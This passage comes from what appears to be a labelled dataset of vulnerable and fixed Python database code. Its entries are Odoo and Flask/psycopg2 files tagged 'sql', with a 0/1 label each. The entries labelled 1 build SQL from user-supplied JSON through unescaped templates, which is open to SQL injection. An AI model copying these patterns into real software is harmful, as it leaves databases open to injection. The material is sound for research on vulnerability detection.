(\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n            query = SQL(\n                \"SELECT id, name FROM {} WHERE {} is NULL\".format(\n                    Identifier(self._table), Identifier(column_name)\n                )\n            )\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                query = SQL(\n                    \"UPDATE {} SET {}=%s WHERE id = %s\".format(\n                        Identifier(self._table), Identifier(column_name)\n                    )\n                )\n                self.env.cr.execute(query, (default_value.id, stage[0]))\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "91513ef7bbe60014dacab709be582eb0b10fcaab", "code": "/crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, column_name),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, column_name, default_value.id, stage[0]),\n                )\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "b0b9410c36bce2e946d48695d9a0eca31b11c15a", "code": "klassifikation/rest/db.py/n/nfrom enum import Enum\n\nimport psycopg2\nfrom psycopg2.extras import DateTimeTZRange\nfrom psycopg2.extensions import adapt as psyco_adapt\n\nfrom jinja2 import Template\nfrom jinja2 import Environment, FileSystemLoader\n\nfrom settings import DATABASE, DB_USER\nfrom db_helpers import get_attribute_fields, get_attribute_names\nfrom db_helpers import get_state_names\n\n\"\"\"\n    Jinja2 Environment\n\"\"\"\n\njinja_env = Environment(loader=FileSystemLoader('./templates/sql'))\n\ndef adapt(value):\n    # return psyco_adapt(value)\n    # Damn you, character encoding!\n    return str(psyco_adapt(value.encode('utf-8'))).decode('utf-8')\n\njinja_env.filters['adapt'] = adapt\n\n\"\"\"\n    GENERAL FUNCTION AND CLASS DEFINITIONS\n\"\"\"\n\n\n\ndef get_connection():\n    \"\"\"Handle all intricacies of connecting to Postgres.\"\"\"\n    connection = psycopg2.connect(\"dbname={0} user={1}\".format(DATABASE,\n                                                               DB_USER))\n    connection.autocommit = True\n    return connection\n\n\ndef get_authenticated_user():\n    \"\"\"Return hardcoded UUID until we get real authentication in place.\"\"\"\n    return \"615957e8-4aa1-4319-a787-f1f7ad6b5e2c\"\n\n\ndef convert_attributes(attributes):\n    \"Convert attributes from dictionary to list in correct order.\"\n    for attr_name in attributes:\n        current_attr_periods = attributes[attr_name]\n        converted_attr_periods = []\n        for attr_period in current_attr_periods:\n            field_names = get_attribute_fields(attr_name)\n            attr_value_list = [\n                attr_period[f] if f in attr_period else None\n                for f in field_names\n                ]\n            converted_attr_periods.append(attr_value_list)\n        attributes[attr_name] = converted_attr_periods\n    return attributes\n\n\nclass Livscyklus(Enum):\n    OPSTAAET = 'Opstaaet'\n    IMPORTERET = 'Importeret'\n    PASSIVERET = 'Passiveret'\n    SLETTET = 'Slettet'\n    RETTET = 'Rettet'\n\n\n\"\"\"\n    GENERAL SQL GENERATION.\n\n    All of these functions generate bits of SQL to use in complete statements.\n    At some point, we might want to factor them to an \"sql_helpers.py\" module.\n\"\"\"\n\n\ndef sql_state_array(state, periods, class_name):\n    \"\"\"Return an SQL array of type <state>TilsType.\"\"\"\n    t = jinja_env.get_template('state_array.sql')\n    sql = t.render(class_name=class_name, state_name=state,\n                   state_periods=periods)\n    return sql\n\n\ndef sql_attribute_array(attribute, periods):\n    \"\"\"Return an SQL array of type <attribute>AttrType[].\"\"\"\n    t = jinja_env.get_template('attribute_array.sql')\n    sql = t.render(attribute_name=attribute, attribute_periods=periods)\n    return sql\n\n\ndef sql_relations_array(class_name, relations):\n    \"\"\"Return an SQL array of type <class_name>RelationType[].\"\"\"\n    t = jinja_env.get_template('relations_array.sql')\n    sql = t.render(class_name=class_name, relations=relations)\n    return sql\n\n\ndef sql_convert_registration(states, attributes, relations, class_name):\n    \"\"\"Convert input JSON to the SQL arrays we need.\"\"\"\n    sql_states = []\n    for s in get_state_names(class_name):\n        periods = states[s] if s in states else []\n        sql_states.append(\n            sql_state_array(s, periods, class_name)\n        )\n\n    sql_attributes = []\n    for a in get_attribute_names(class_name):\n        periods = attributes[a] if a in attributes else []\n        sql_attributes.append(\n            sql_attribute_array(a, periods)\n        )\n\n    sql_relations = sql_relations_array(class_name, relations)\n\n    return (sql_states, sql_attributes, sql_relations)\n\n\n\"\"\"\n    GENRAL OBJECT RELATED FUNCTIONS\n\"\"\"\n\n\ndef object_exists(class_name, uuid):\n    \"\"\"Check if an object with this class name and UUID exists already.\"\"\"\n    sql = \"select (%s IN (SELECT DISTINCT facet_id from facet_registrering))\"\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, (uuid,))\n    result = cursor.fetchone()[0]\n    \n    return result\n\n\ndef create_or_import_object(class_name, note, attributes, states, relations,\n                            uuid=None):\n    \"\"\"Create a new object by calling the corresponding stored procedure.\n\n    Create a new object by calling actual_state_create_or_import_{class_name}.\n    It is necessary to map the parameters to our custom PostgreSQL data types.\n    \"\"\"\n\n    # Data from the BaseRegistration.\n    # Do not supply date, that is generated by the DB.\n    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None\n                       else Livscyklus.IMPORTERET.value)\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n    sql_template = jinja_env.get_template('create_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef delete_object(class_name, note, uuid):\n    \"\"\"Delete object by using the stored procedure.\n    \n    Deleting is the same as updating with the life cycle code \"Slettet\".\n    \"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.SLETTET.value\n    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\ndef passivate_object(class_name, note, uuid):\n    \"\"\"Passivate object by calling the stored procedure.\"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.PASSIVERET.value\n    sql_template = jinja_env.get_template('passivate_or_delete_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef update_object(class_name, note, attributes, states, relations, uuid=None):\n    \"\"\"Update object with the partial data supplied.\"\"\"\n    life_cycle_code = Livscyklus.RETTET.value\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n\n    sql_template = jinja_env.get_template('update_object.sql')\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    try:\n        cursor.execute(sql)\n        output = cursor.fetchone()\n        print output\n    except psycopg2.DataError:\n        # Thrown when no changes\n        pass\n    return uuid\n\n\ndef list_objects(class_name, uuid, virkning_fra, virkning_til,\n                 registreret_fra, registreret_til):\n    \"\"\"List objects with the given uuids, optionally filtering by the given\n    virkning and registering periods.\"\"\"\n\n    assert isinstance(uuid, list)\n\n    sql_template = jinja_env.get_template('list_objects.sql')\n    sql = sql_template.render(\n        class_name=class_name\n    )\n\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, {\n        'uuid': uuid,\n        'registrering_tstzrange': DateTimeTZRange(registreret_fra,\n                                                  registreret_til),\n        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)\n    })\n    output = cursor.fetchone()\n    return output\n/n/n/nklassifikation/rest/oio_rest.py/n/n\nfrom flask import jsonify, request\nimport db\n\n\n# Just a helper during debug\ndef j(t): return jsonify(output=t)\n\n\nclass OIOStandardHierarchy(object):\n    \"\"\"Implement API for entire hierarchy.\"\"\"\n\n    _classes = []\n\n    @classmethod\n    def setup_api(cls, flask, base_url):\n        \"\"\"Set up API for the classes included in the hierarchy.\n\n        Note that version number etc. may have to be added to the URL.\"\"\"\n        for c in cls._classes:\n            c.create_api(cls._name, flask, base_url)\n\n\nclass OIORestObject(object):\n    \"\"\"\n    Implement an OIO object - manage access to database layer for this object.\n\n    This class is intended to be subclassed, but not to be initialized.\n    \"\"\"\n\n    @classmethod\n    def create_object(cls):\n        \"\"\"\n        CREATE object, generate new UUID.\n        \"\"\"\n        if not request.json:\n            return jsonify({'uuid': None}), 400\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n        uuid = db.create_or_import_object(cls.__name__, note, attributes,\n                                          states, relations)\n        return jsonify({'uuid': uuid}), 201\n\n    @classmethod\n    def get_objects(cls):\n        \"\"\"\n        LIST or SEARCH facets, depending on parameters.\n        \"\"\"\n        virkning_fra = request.args.get('virkningFra', None)\n        virkning_til = request.args.get('virkningTil', None)\n        registreret_fra = request.args.get('registreretFra', None)\n        registreret_til = request.args.get('registreretTil', None)\n\n        # TODO: Implement search\n\n        uuid = request.args.get('uuid', None)\n        if uuid is None:\n            # This is not allowed, but we let the DB layer throw an exception\n            uuid = []\n        else:\n            uuid = uuid.split(',')\n\n        results = db.list_objects(cls.__name__, uuid, virkning_fra,\n                                 virkning_til, registreret_fra,\n                                 registreret_til)\n        if results is None:\n            results = []\n        # TODO: Return JSON object key should be based on class name,\n        # e.g. {\"Facetter\": [..]}, not {\"results\": [..]}\n        # TODO: Include Return value\n        return jsonify({'results': results})\n\n    @classmethod\n    def get_object(cls, uuid):\n        \"\"\"\n        READ a facet, return as JSON.\n        \"\"\"\n        return j(\"Hent {0} fra databasen og returner som JSON\".format(uuid))\n\n    @classmethod\n    def put_object(cls, uuid):\n        \"\"\"\n        UPDATE, IMPORT or PASSIVIZE an  object.\n        \"\"\"\n        if not request.json:\n            return jsonify({'uuid': None}), 400\n        # Get most common parameters if available.\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n\n        if not db.object_exists(cls.__name__, uuid):\n            # Do import.\n            result = db.create_or_import_object(cls.__name__, note, attributes,\n                                                states, relations, uuid)\n            # TODO: When connected to DB, use result properly.\n            return j(u\"Importeret {0}: {1}\".format(cls.__name__, uuid)), 200\n        else:\n            \"Edit or passivate.\"\n            if (request.json.get('livscyklus', '').lower() == 'passiv'):\n                # Passivate\n                db.passivate_object(\n                        cls.__name__, note, uuid\n                )\n                return j(\n                            u\"Passiveret {0}: {1}\".format(cls.__name__, uuid)\n                        ), 200\n            else:\n                # Edit/change\n                result = db.update_object(cls.__name__, note, attributes,\n                                          states, relations, uuid)\n                return j(u\"Opdateret {0}: {1}\".format(cls.__name__, uuid)), 200\n        return j(u\"Forkerte parametre!\"), 405\n\n    @classmethod\n    def delete_object(cls, uuid):\n        # Delete facet\n        #import pdb; pdb.set_trace()\n        note = request.json.get(\"Note\", \"\")\n        class_name = cls.__name__\n        result = db.delete_object(class_name, note, uuid)\n\n        return j(\"Slettet {0}: {1}\".format(class_name, uuid)), 200\n\n    @classmethod\n    def create_api(cls, hierarchy, flask, base_url):\n        \"\"\"Set up API with correct database access functions.\"\"\"\n        hierarchy = hierarchy.lower()\n        class_name = cls.__name__.lower()\n        class_url = u\"{0}/{1}/{2}\".format(base_url,\n                                          hierarchy,\n                                          cls.__name__.lower())\n        uuid_regex = (\n            \"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}\" +\n            \"-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\"\n        )\n        object_url = u'{0}/<regex(\"{1}\"):uuid>'.format(\n            class_url,\n            uuid_regex\n        )\n\n        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),\n                           cls.get_objects, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),\n                           cls.get_object, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),\n                           cls.put_object, methods=['PUT'])\n\n        flask.add_url_rule(\n            class_url, u'_'.join([cls.__name__, 'create_object']),\n            cls.create_object, methods=['POST']\n        )\n\n        flask.add_url_rule(\n            object_url, u'_'.join([cls.__name__, 'delete_object']),\n            cls.delete_object, methods=['DELETE']\n        )\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "b0b9410c36bce2e946d48695d9a0eca31b11c15a", "code": "/klassifikation/rest/db.py/n/nfrom enum import Enum\n\nimport psycopg2\nfrom psycopg2.extras import DateTimeTZRange\nfrom jinja2 import Template\n\nfrom settings import DATABASE, DB_USER\nfrom db_helpers import get_attribute_fields, get_attribute_names\nfrom db_helpers import get_state_names\n\n\"\"\"\n    GENERAL FUNCTION AND CLASS DEFINITIONS\n\"\"\"\n\n\ndef get_connection():\n    \"\"\"Handle all intricacies of connecting to Postgres.\"\"\"\n    connection = psycopg2.connect(\"dbname={0} user={1}\".format(DATABASE,\n                                                               DB_USER))\n    connection.autocommit = True\n    return connection\n\n\ndef get_authenticated_user():\n    \"\"\"Return hardcoded UUID until we get real authentication in place.\"\"\"\n    return \"615957e8-4aa1-4319-a787-f1f7ad6b5e2c\"\n\n\ndef convert_attributes(attributes):\n    \"Convert attributes from dictionary to list in correct order.\"\n    for attr_name in attributes:\n        current_attr_periods = attributes[attr_name]\n        converted_attr_periods = []\n        for attr_period in current_attr_periods:\n            field_names = get_attribute_fields(attr_name)\n            attr_value_list = [\n                attr_period[f] if f in attr_period else None\n                for f in field_names\n                ]\n            converted_attr_periods.append(attr_value_list)\n        attributes[attr_name] = converted_attr_periods\n    return attributes\n\n\nclass Livscyklus(Enum):\n    OPSTAAET = 'Opstaaet'\n    IMPORTERET = 'Importeret'\n    PASSIVERET = 'Passiveret'\n    SLETTET = 'Slettet'\n    RETTET = 'Rettet'\n\n\n\"\"\"\n    GENERAL SQL GENERATION.\n\n    All of these functions generate bits of SQL to use in complete statements.\n    At some point, we might want to factor them to an \"sql_helpers.py\" module.\n\"\"\"\n\n\ndef sql_state_array(state, periods, class_name):\n    \"\"\"Return an SQL array of type <state>TilsType.\"\"\"\n    with open('templates/sql/state_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(class_name=class_name, state_name=state,\n                   state_periods=periods)\n    return sql\n\n\ndef sql_attribute_array(attribute, periods):\n    \"\"\"Return an SQL array of type <attribute>AttrType[].\"\"\"\n    with open('templates/sql/attribute_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(attribute_name=attribute, attribute_periods=periods)\n    return sql\n\n\ndef sql_relations_array(class_name, relations):\n    \"\"\"Return an SQL array of type <class_name>RelationType[].\"\"\"\n    with open('templates/sql/relations_array.sql', 'r') as f:\n        raw_sql = f.read()\n    t = Template(raw_sql)\n    sql = t.render(class_name=class_name, relations=relations)\n    return sql\n\n\ndef sql_convert_registration(states, attributes, relations, class_name):\n    \"\"\"Convert input JSON to the SQL arrays we need.\"\"\"\n    sql_states = []\n    for s in get_state_names(class_name):\n        periods = states[s] if s in states else []\n        sql_states.append(\n            sql_state_array(s, periods, class_name)\n        )\n\n    sql_attributes = []\n    for a in get_attribute_names(class_name):\n        periods = attributes[a] if a in attributes else []\n        sql_attributes.append(\n            sql_attribute_array(a, periods)\n        )\n\n    sql_relations = sql_relations_array(class_name, relations)\n\n    return (sql_states, sql_attributes, sql_relations)\n\n\n\"\"\"\n    GENRAL OBJECT RELATED FUNCTIONS\n\"\"\"\n\n\ndef object_exists(class_name, uuid):\n    \"\"\"Check if an object with this class name and UUID exists already.\"\"\"\n    sql = \"select (%s IN (SELECT DISTINCT facet_id from facet_registrering))\"\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, (uuid,))\n    result = cursor.fetchone()[0]\n    \n    return result\n\n\ndef create_or_import_object(class_name, note, attributes, states, relations,\n                            uuid=None):\n    \"\"\"Create a new object by calling the corresponding stored procedure.\n\n    Create a new object by calling actual_state_create_or_import_{class_name}.\n    It is necessary to map the parameters to our custom PostgreSQL data types.\n    \"\"\"\n\n    # Data from the BaseRegistration.\n    # Do not supply date, that is generated by the DB.\n    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None\n                       else Livscyklus.IMPORTERET.value)\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n    with open('templates/sql/create_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef delete_object(class_name, note, uuid):\n    \"\"\"Delete object by using the stored procedure.\n    \n    Deleting is the same as updating with the life cycle code \"Slettet\".\n    \"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.SLETTET.value\n    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call Postgres! Return OK or not accordingly\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\ndef passivate_object(class_name, note, uuid):\n    \"\"\"Passivate object by calling the stored procedure.\"\"\"\n\n    user_ref = get_authenticated_user()\n    life_cycle_code = Livscyklus.PASSIVERET.value\n    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note\n    )\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    output = cursor.fetchone()\n    print output\n    return output[0]\n\n\ndef update_object(class_name, note, attributes, states, relations, uuid=None):\n    \"\"\"Update object with the partial data supplied.\"\"\"\n    life_cycle_code = Livscyklus.RETTET.value\n    user_ref = get_authenticated_user()\n\n    attributes = convert_attributes(attributes)\n    (\n        sql_states, sql_attributes, sql_relations\n    ) = sql_convert_registration(states, attributes, relations, class_name)\n\n    with open('templates/sql/update_object.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name,\n        uuid=uuid,\n        life_cycle_code=life_cycle_code,\n        user_ref=user_ref,\n        note=note,\n        states=sql_states,\n        attributes=sql_attributes,\n        relations=sql_relations)\n    # Call PostgreSQL\n    conn = get_connection()\n    cursor = conn.cursor()\n    try:\n        cursor.execute(sql)\n        output = cursor.fetchone()\n        print output\n    except psycopg2.DataError:\n        # Thrown when no changes\n        pass\n    return uuid\n\n\ndef list_objects(class_name, uuid, virkning_fra, virkning_til,\n                 registreret_fra, registreret_til):\n    \"\"\"List objects with the given uuids, optionally filtering by the given\n    virkning and registering periods.\"\"\"\n\n    assert isinstance(uuid, list)\n\n    with open('templates/sql/list_objects.sql', 'r') as f:\n        sql_raw = f.read()\n    sql_template = Template(sql_raw)\n    sql = sql_template.render(\n        class_name=class_name\n    )\n\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute(sql, {\n        'uuid': uuid,\n        'registrering_tstzrange': DateTimeTZRange(registreret_fra,\n                                                  registreret_til),\n        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)\n    })\n    output = cursor.fetchone()\n    return output\n/n/n/n/klassifikation/rest/oio_rest.py/n/n\nfrom flask import jsonify, request\nimport db\n\n\n# Just a helper during debug\ndef j(t): return jsonify(output=t)\n\n\nclass OIOStandardHierarchy(object):\n    \"\"\"Implement API for entire hierarchy.\"\"\"\n\n    _classes = []\n\n    @classmethod\n    def setup_api(cls, flask, base_url):\n        \"\"\"Set up API for the classes included in the hierarchy.\n\n        Note that version number etc. may have to be added to the URL.\"\"\"\n        for c in cls._classes:\n            c.create_api(cls._name, flask, base_url)\n\n\nclass OIORestObject(object):\n    \"\"\"\n    Implement an OIO object - manage access to database layer for this object.\n\n    This class is intended to be subclassed, but not to be initialized.\n    \"\"\"\n\n    @classmethod\n    def create_object(cls):\n        \"\"\"\n        CREATE object, generate new UUID.\n        \"\"\"\n        if not request.json:\n            abort(400)\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n        uuid = db.create_or_import_object(cls.__name__, note, attributes,\n                                          states, relations)\n        return jsonify({'uuid': uuid}), 201\n\n    @classmethod\n    def get_objects(cls):\n        \"\"\"\n        LIST or SEARCH facets, depending on parameters.\n        \"\"\"\n        virkning_fra = request.args.get('virkningFra', None)\n        virkning_til = request.args.get('virkningTil', None)\n        registreret_fra = request.args.get('registreretFra', None)\n        registreret_til = request.args.get('registreretTil', None)\n\n        # TODO: Implement search\n\n        uuid = request.args.get('uuid', None)\n        if uuid is None:\n            # This is not allowed, but we let the DB layer throw an exception\n            uuid = []\n        else:\n            uuid = uuid.split(',')\n\n        results = db.list_objects(cls.__name__, uuid, virkning_fra,\n                                 virkning_til, registreret_fra,\n                                 registreret_til)\n        if results is None:\n            results = []\n        # TODO: Return JSON object key should be based on class name,\n        # e.g. {\"Facetter\": [..]}, not {\"results\": [..]}\n        # TODO: Include Return value\n        return jsonify({'results': results})\n\n    @classmethod\n    def get_object(cls, uuid):\n        \"\"\"\n        READ a facet, return as JSON.\n        \"\"\"\n        return j(\"Hent {0} fra databasen og returner som JSON\".format(uuid))\n\n    @classmethod\n    def put_object(cls, uuid):\n        \"\"\"\n        UPDATE, IMPORT or PASSIVIZE an  object.\n        \"\"\"\n        if not request.json:\n            abort(400)\n        # Get most common parameters if available.\n        note = request.json.get(\"Note\", \"\")\n        attributes = request.json.get(\"Attributter\", {})\n        states = request.json.get(\"Tilstande\", {})\n        relations = request.json.get(\"Relationer\", {})\n\n        if not db.object_exists(cls.__name__, uuid):\n            # Do import.\n            result = db.create_or_import_object(cls.__name__, note, attributes,\n                                                states, relations, uuid)\n            # TODO: When connected to DB, use result properly.\n            return j(u\"Importeret {0}: {1}\".format(cls.__name__, uuid)), 200\n        else:\n            \"Edit or passivate.\"\n            if (request.json.get('livscyklus', '').lower() == 'passiv'):\n                # Passivate\n                db.passivate_object(\n                        cls.__name__, note, uuid\n                )\n                return j(\n                            u\"Passiveret {0}: {1}\".format(cls.__name__, uuid)\n                        ), 200\n            else:\n                # Edit/change\n                result = db.update_object(cls.__name__, note, attributes,\n                                          states, relations, uuid)\n                return j(u\"Opdateret {0}: {1}\".format(cls.__name__, uuid)), 200\n        return j(u\"Forkerte parametre!\"), 405\n\n    @classmethod\n    def delete_object(cls, uuid):\n        # Delete facet\n        #import pdb; pdb.set_trace()\n        note = request.json.get(\"Note\", \"\")\n        class_name = cls.__name__\n        result = db.delete_object(class_name, note, uuid)\n\n        return j(\"Slettet {0}: {1}\".format(class_name, uuid)), 200\n\n    @classmethod\n    def create_api(cls, hierarchy, flask, base_url):\n        \"\"\"Set up API with correct database access functions.\"\"\"\n        hierarchy = hierarchy.lower()\n        class_name = cls.__name__.lower()\n        class_url = u\"{0}/{1}/{2}\".format(base_url,\n                                          hierarchy,\n                                          cls.__name__.lower())\n        uuid_regex = (\n            \"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}\" +\n            \"-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\"\n        )\n        object_url = u'{0}/<regex(\"{1}\"):uuid>'.format(\n            class_url,\n            uuid_regex\n        )\n\n        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),\n                           cls.get_objects, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),\n                           cls.get_object, methods=['GET'])\n\n        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),\n                           cls.put_object, methods=['PUT'])\n\n        flask.add_url_rule(\n            class_url, u'_'.join([cls.__name__, 'create_object']),\n            cls.create_object, methods=['POST']\n        )\n\n        flask.add_url_rule(\n            object_url, u'_'.join([cls.__name__, 'delete_object']),\n            cls.delete_object, methods=['DELETE']\n        )\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "5329d91f9e569c95184053c8e7ef596949c33ce9", "code": "modules/comment.py/n/nfrom modules import sql\n\n\nclass Comment:\n    def __init__(self,conn):\n        self.conn=conn;\n    \n    def getCommentsByUser(self,userid):\n        sqlText=\"select comment from comments order by date desc where userid=%s\"\n        params=[userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getCommentsByPostid(self,postid,userid):\n        sqlText=\"select (select Count(*) from comment_like where \\\n        comments.commentid = comment_like.commentid) as like,(select Count(*) \\\n                from comment_like where comments.commentid = \\\n                comment_like.commentid and comment_like.userid=%s) as \\\n                flag,commentid,name,comment from users,comments where \\\n                users.userid=comments.userid and postid=%s order by date desc;\"\n        params=[userid,postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n    def getCommentsLike(self,commentid):\n        sqlText=\"select userid from comment_like where commentid=%s\"\n        params=[commentid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\t\n    def insertData(self,comment,userid,postid):\n        sqlText=\"insert into comments(comment,userid,date,postid) \\\n        values(%s,%s,current_timestamp(0),%s);\"\n        params=[comment,userid,postid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def deleteComment(self,commentid):\n        sqlText=\"delete from comments where commentid=%s\"\n        params=[commentid]\n        